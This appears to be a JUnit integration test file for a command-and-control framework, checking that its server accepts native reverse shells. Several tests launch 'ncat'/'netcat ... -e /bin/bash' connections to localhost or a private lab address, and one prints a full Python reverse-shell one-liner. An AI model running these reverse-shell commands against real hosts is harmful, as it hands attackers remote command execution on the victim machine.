package c2.nativeshell;

import java.io.IOException;

import org.junit.jupiter.api.Test;

import c2.remote.RemoteTestExecutor;
import util.Time;
import util.test.ClientServerTest;
import util.test.RunnerTestGeneric;
import util.test.TestConfiguration;
import util.test.TestConfiguration.OS;
import util.test.TestConstants;

class NcatIntegrationTest extends ClientServerTest {

	@Test
	void test() {
		TestConfiguration.OS thisOS = TestConfiguration.getThisSystemOS();

		String ncatName = "ncat";

		try {
			Runtime.getRuntime().exec(ncatName);
		} catch (IOException e) {
			System.out.println("ncat not available on this host, attempting netcat");
			try {
				Runtime.getRuntime().exec("netcat");
				ncatName = "netcat";
			} catch (IOException ex) {
				System.out.println("netcat not available on this host, skipping this test");
				return;
			}
		}

		if (thisOS == OS.WINDOWS) {
			initiateServer();
			spawnClient(TestConstants.WINDOWSNATIVE_TEST_EXE);
		} else {
			initiateServer("test_linux.properties");
			spawnClient(ncatName + " localhost 8003 -e /bin/bash");
		}
		RunnerTestGeneric.test(new TestConfiguration(thisOS, "Native", "TCP"));
		awaitClient();
		teardown();

	}

	@Test
	void testLocalLinuxPython() {
		TestConfiguration.OS thisOS = TestConfiguration.getThisSystemOS();
		if (thisOS == OS.LINUX) {
			initiateServer("test_linux.properties");
			spawnPythonOneliner();
			RunnerTestGeneric.test(new TestConfiguration(thisOS, "Native", "TCP"));
			awaitClient();
			teardown();
		}
	}

	@Test
	void testCrossPlatform() {
		if (TestConfiguration.getThisSystemOS() == OS.WINDOWS) {
			initiateServer();

			RemoteTestExecutor exec = new RemoteTestExecutor();
			if (exec.startTestProgram(1005, "netcat 192.168.56.1 8003 -e /bin/bash")) {
				;

				System.out.println("Transmitting commands");

				TestConfiguration config = new TestConfiguration(OS.LINUX, "Native", "TCP");
				config.setRemote(true);
				RunnerTestGeneric.test(config);
			} else {
				System.out.println("No remote test available, spinning down test");
			}
			teardown();
		}
	}

	@Test
	void testLinuxPythonOneLiner() {
		if (TestConfiguration.getThisSystemOS() == OS.WINDOWS) {
			initiateServer();
			RemoteTestExecutor exec = new RemoteTestExecutor();
			// exec.startTestProgram(1005, "python3 -c 'import
			// socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",8003));os.dup2(s.fileno(),0);
			// os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call
			// ([\"/bin/sh\",\"-i\"]);'");
			exec.startTestProgram(1005, RemoteTestExecutor.CMD_EXECUTE_PYTHON);
			System.out.println(
					"Please start Linux python oneliner session now, such as: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);'");
			Time.sleepWrapped(15000);

			System.out.println("Transmitting commands");

			TestConfiguration config = new TestConfiguration(OS.LINUX, "Native", "TCP");
			config.setRemote(true);
			RunnerTestGeneric.test(config);
			teardown();
		}
	}

}
